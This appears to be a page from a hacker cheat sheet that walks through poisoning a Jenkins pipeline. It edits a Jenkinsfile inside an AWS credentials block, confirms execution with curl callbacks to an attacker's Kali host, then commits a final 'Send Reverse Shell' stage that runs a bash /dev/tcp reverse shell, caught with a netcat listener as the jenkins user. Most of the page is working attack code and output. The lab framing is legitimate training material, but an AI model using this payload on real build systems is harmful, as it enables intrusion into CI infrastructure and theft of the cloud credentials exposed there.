# Modifying the Pipeline

Basic Jenkinsfile
>``` shell
>pipeline {
>  agent any
>  stages {
>    stage('Build') {
>      steps {
>        echo 'Building..'
>      }
>    }
>  }
>}
>```

Basic Jenkinsfile - withAWS
>``` shell
>pipeline {
>  agent any
>  stages {
>    stage('Build') {
>      steps {
>        withAWS(region: 'us-east-1', credentials: 'aws_key') {
>          echo 'Building..'
>        }
>      }
>    }
>  }
>}
>```

Basic Jenkinsfile - script
>``` shell
>pipeline {
>  agent any
>  stages {
>    stage('Build') {
>      steps {
>        withAWS(region: 'us-east-1', credentials: 'aws_key') {
>          script {
>            echo 'Building..'
>          }
>        }
>      }
>    }
>  }
>}
>```

Basic Jenkinsfile - curl
>``` shell
>pipeline {
>  agent any
>  stages {
>    stage('Build') {
>      steps {
>        withAWS(region: 'us-east-1', credentials: 'aws_key') {
>          script {
>            sh 'curl http://192.88.99.76/'
>          }
>        }
>      }
>    }
>  }
>}
>```

Basic Jenkinsfile - isUnix
>``` shell
>pipeline {
>  agent any
>  stages {
>    stage('Build') {
>      steps {
>        withAWS(region: 'us-east-1', credentials: 'aws_key') {
>          script {
>            if (isUnix()) {
>              sh 'curl http://192.88.99.76/unix'
>            }
>          }
>        }
>      }
>    }
>  }
>}
>```

Logging into Kali
>``` shell
>kali@kali:~$ ssh kali@192.88.99.76
>
># ========== Expected Result ==========
>The authenticity of host '192.88.99.76 (192.88.99.76)' can't be established.
>ED25519 key fingerprint is SHA256:uw2cM/UTH1lO2xSphPrIBa66w3XqioWiyrWRgHND/WI.
>This key is not known by any other names.
>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
>Warning: Permanently added '192.88.99.76' (ED25519) to the list of known hosts.
>kali@192.88.99.76's password: 
>kali@cloud-kali:~$ 
># =====================================
>```

Starting apache2 on Kali
>``` shell
>kali@cloud-kali:~$ sudo systemctl start apache2
>```

Edit Jenkinsfile
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Modifying-the-Pipeline-1.png)

Committing the Jenkinsfile
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Modifying-the-Pipeline-2.png)

Checking apache logs
>``` shell
>kali@cloud-kali:~$ cat /var/log/apache2/access.log
>
># ========== Expected Result ==========
>198.18.53.73 - - [27/Apr/2023:19:34:40 +0000] "GET /unix HTTP/1.1" 404 436 "-" "curl/7.74.0"
># =====================================
>```

Reverse shell
>``` shell
>bash -i >& /dev/tcp/192.88.99.76/4242 0>&1
>```

Basic Jenkinsfile - Final Payload
>``` shell
>pipeline {
>  agent any
>  stages {
>    stage('Send Reverse Shell') {
>      steps {
>        withAWS(region: 'us-east-1', credentials: 'aws_key') {
>          script {
>            if (isUnix()) {
>              sh 'bash -c "bash -i >& /dev/tcp/192.88.99.76/4242 0>&1" & '
>            }
>          }
>        }
>      }
>    }
>  }
>}
>```

Starting Netcat on Kali
>``` shell
>kali@cloud-kali:~$ nc -nvlp 4242
>
># ========== Expected Result ==========
>listening on [any] 4242 ...
># =====================================
>```

Capture Reverse Shell
>``` shell
>kali@cloud-kali:~$ nc -nvlp 4242
>
># ========== Expected Result ==========
>listening on [any] 4242 ...
>connect to [10.0.1.78] from (UNKNOWN) [198.18.53.73] 54980
>bash: cannot set terminal process group (58): Inappropriate ioctl for device
>bash: no job control in this shell
># =====================================
>
>jenkins@5e0ed1dc7ffe:~/agent/workspace/image-transform$ whoami
>
># ========== Expected Result ==========
>whoami
>jenkins
># =====================================
>```
